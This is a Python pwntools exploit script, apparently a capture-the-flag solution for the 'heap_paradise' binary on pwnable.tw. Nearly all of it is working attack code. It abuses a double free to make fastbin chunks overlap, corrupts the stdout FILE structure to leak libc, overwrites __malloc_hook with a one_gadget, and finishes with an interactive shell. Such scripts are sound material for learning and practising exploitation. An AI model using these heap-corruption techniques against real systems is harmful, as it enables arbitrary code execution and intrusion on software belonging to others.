#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import os
context.binary = "./heap_paradise"
#  context.log_level = "debug"

local = False

if local:
    io = process("./heap_paradise")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
    libc.sym['one_gadget'] = 0xf02a4
else:
    io = remote("chall.pwnable.tw", 10308)
    libc = ELF("./libc_64.so.6", checksec = False)
    libc.sym['one_gadget'] = 0xef6c4

def add(size, data):
    io.sendlineafter(":", "1")
    sleep(0.01)
    io.sendlineafter(":", str(size))
    sleep(0.01)
    io.sendafter(":", data)
    sleep(0.01)

def delete(idx):
    io.sendlineafter(":", "2")
    sleep(0.01)
    io.sendlineafter(":", str(idx))
    sleep(0.01)

def DEBUG():
    base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
    warn("malloc @ {:#x}".format(base + 0xCF4))
    warn("readn @ {:#x}".format(base + 0xD66))
    warn("free @ {:#x}".format(base + 0xDCD))
    pause()

add(0x68, p64(0x71) * 12) # 0
add(0x68, p64(0x71) * 13) # 1
add(0x68, p64(0x21) * 13) # 2

delete(0)
delete(1)
delete(0)

add(0x68, '\x60') # 3
add(0x68, '2' * 8) # 4
add(0x68, '3' * 8) # 5
add(0x68, flat(0, 0x91)) # 6

delete(1)
add(0x68, '\xdd\x25') # 7

delete(0)
delete(6)
delete(0)

#  DEBUG()
add(0x68, p64(0x71) * 12 + '\x70') # 8, overlap
add(0x68, '6') # 9
add(0x68, '7') # 10
add(0x68, flat('\0' * 0x33, 0xfbad1800, 0, 0, 0, '\0')) # 11

#  io.recvuntil("Choice:")
io.recvn(0x40)
libc.address = u64(io.recvn(6) + '\0\0') - 192 - libc.sym['_IO_2_1_stderr_']
assert(libc.address & 0xfff == 0)
success("libc @ {:#x}".format(libc.address))

delete(0)
delete(6)
delete(0)

add(0x68, p64(0x71) * 12+ p64(libc.symbols['__malloc_hook'] - 0x23)) # 12, overlap
add(0x68, "x") # 13
add(0x68, flat('\0' * 19, libc.sym['one_gadget'])) # 14

delete(0)
delete(0)

io.interactive()
